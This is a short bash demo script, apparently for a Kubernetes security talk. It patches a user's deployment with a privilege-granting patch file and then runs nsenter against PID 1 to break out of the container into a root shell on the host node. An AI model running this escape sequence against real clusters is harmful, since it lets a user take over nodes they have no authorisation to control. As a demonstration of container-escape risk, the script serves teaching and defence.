#!/usr/bin/env bash

. ../scripts/demo-magic.sh
TYPE_SPEED=${SPEED:-}

pei "export KUBECONFIG=./user4-kubeconfig"
export KUBECONFIG=./user4-kubeconfig

pei "kubectl wait --for=jsonpath='{.status.readyReplicas}=1' deploy/n4"

echo "ℹ️ Get the tools";read -s
pei "kubectl exec deploy/n4 -ti -- sh -c 'apt update && apt install -y procps'"

MSGS=(
    "Take FULL control over the node? 💪"
    "Come on, you know you want to! 🤔"
    "LAST chance! With great power comes.. great FUN! 🤗"
)
i=0

while [ $i -lt ${#MSGS[@]} ];do
    echo
    echo -n "❓ ${MSGS[i]}  [y/n]";read -n1
    if [ "${REPLY:-n}" = "y" ];then
        break
    fi
    i=$((i+1))
done
if [ "${REPLY:-n}" = "y" ];then

    kubectl patch deployment n4 --patch-file=power.patch
    pei "kubectl rollout status -w deploy/n4"

    pei "kubectl exec deploy/n4 -ti -- sh -c 'apt update && apt install -y procps'"
    pei "kubectl exec deploy/n4 -ti -- sh -c 'nsenter --target 1 --mount --uts --ipc --net --pid -- bash'"
    kubectl exec deploy/n4 -ti -- sh -c "bash"
fi


